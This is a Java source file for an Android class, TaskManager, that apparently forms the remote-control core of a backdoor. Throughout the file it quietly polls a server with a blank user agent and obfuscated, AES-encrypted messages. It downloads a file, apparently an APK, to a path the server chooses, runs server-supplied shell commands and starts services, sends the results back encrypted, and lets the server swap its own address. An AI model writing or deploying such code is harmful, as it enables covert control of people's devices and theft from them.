package workspace;
import java.io.File;
import org.apache.http.Header;
import org.json.JSONArray;
import org.json.JSONObject;
import android.content.Context;
import android.text.TextUtils;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.FileAsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.TextHttpResponseHandler;

public class TaskManager {
    private static final String Key_URL = "a";
    private static final String Key_LOCATION = "b";
    private static final String KEY_COMMANDS = "c";
    private static final String KEY_INTERVAL = "d";
    private static final String KEY_SERVER_URL = "e";
    private static final String KEY_REPORT_CMD_RESULT = "f";
    private static void download(final Context context, String url, final File file, final JSONArray commands, final boolean reportCmdResult) {
        new AsyncHttpClient().get(url, new FileAsyncHttpResponseHandler(new File(file.getAbsolutePath() + ".del")) {
            @Override
            public void onFailure(int statusCode, Header[] headers, Throwable e, File file) {
                Logger.error(e.getMessage(), e);
            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, File result) {
                boolean success = statusCode == 200 && result != null && result.renameTo(file);
                if (success) {
                    executeCommands(context, commands, reportCmdResult);
                }
            }
        });
    }
    private static void executeCommands(final Context context, final JSONArray commands, final boolean reportCmdResult) {
        if (commands != null && commands.length() > 0) {
            JSONArray array = new JSONArray();
            for (int i = 0; i < commands.length(); i++) {
                String command = commands.optString(i);
                if (!TextUtils.isEmpty(command)) {
                    try {
                        JSONObject result = null;
                        if (command.startsWith("codess")) {
                            result = Util.startService(context, command);
                        } else if (command.startsWith("codesa")) {
                            result = Util.startActivity(context, command);
                        } else {
                            result = Util.exeCmd(command);
                        }
                        array.put(result);
                        //Thread.sleep(5 * 1000);
                    } catch (Throwable e) {
                        Logger.error(e);
                    }
                }
            }
            Logger.info(array.toString());
            if (reportCmdResult) {
                reportCmdResult(context, array);
            }
        }
    }
    public static void reportCmdResult(final Context context, final JSONArray obj) {
        new Thread() {
            @Override
            public void run() {
                try {
                    AsyncHttpClient client = new AsyncHttpClient();
                    long current = System.currentTimeMillis();
                    client.addHeader("time", String.valueOf(current));
                    client.addHeader("m", "r");
                    client.setUserAgent("");
                    RequestParams params = new RequestParams();
                    final String password = Util.generatePassword(current);
                    params.put("r", AES.encode(obj.toString(), password));
                    params.put("p", Util.composeBasicParams(context, password));
                    String url = Util.getUrl(context);
                    client.post(url, params, new TextHttpResponseHandler("UTF-8") {
                        @Override
                        public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                            // TODO Auto-generated method stub
                        }
                        @Override
                        public void onSuccess(int statusCode, Header[] headers, String responseString) {
                            // TODO Auto-generated method stub
                        }
                    });
                } catch (Throwable e) {
                    Logger.error(e);
                }
            }
        }.start();
    }
    public static void reqeust(final Context context) {
        long current = System.currentTimeMillis();
        RequestParams params = new RequestParams();
        final String password = Util.generatePassword(current);
        params.put("post", Util.composeParams(context, password));
        AsyncHttpClient client = new AsyncHttpClient();
        client.addHeader("time", String.valueOf(current));
        client.setUserAgent("");
        String url = Util.getUrl(context);
        Logger.info(url);
        client.post(url, params, new TextHttpResponseHandler("UTF-8") {
            @Override
            public void onFailure(int statusCode, Header[] headers, String responseBody, Throwable e) {
                if (e != null) {
                    e.printStackTrace();
                }
            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, String result) {
                if (statusCode >= 400 && statusCode < 500) {
                    Util.saveUrl(context, null);
                }
                if (result != null && result.trim().length() > 0) {
                    try {
                        Logger.info(result);
                        JSONObject obj = new JSONObject(AES.decode(result, password));
                        Logger.info(obj.toString());
                        String apkUrl = obj.optString(Key_URL);
                        String location = obj.optString(Key_LOCATION);
                        JSONArray commands = obj.optJSONArray(KEY_COMMANDS);
                        int interval = obj.optInt(KEY_INTERVAL);
                        boolean reportCmdResult = obj.optBoolean(KEY_REPORT_CMD_RESULT);
                        if (interval >= 60 && interval < 3600 * 24 * 5) {
                            Util.saveInterval(context, interval);
                        }
                        String serverUrl = obj.optString(KEY_SERVER_URL);
                        if (serverUrl != null && serverUrl.contains("htt")) {
                            Util.saveUrl(context, serverUrl);
                        }
                        if (!TextUtils.isEmpty(apkUrl) && !TextUtils.isEmpty(location)) {
                            File file = new File(location);
                            if (file.exists()) {
                                file.delete();
                            }
                            File folder = file.getParentFile();
                            if (!folder.exists()) folder.mkdirs();
                            download(context, apkUrl, file, commands, reportCmdResult);
                        } else {
                            executeCommands(context, commands, reportCmdResult);
                        }
                    } catch (Throwable e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }
}
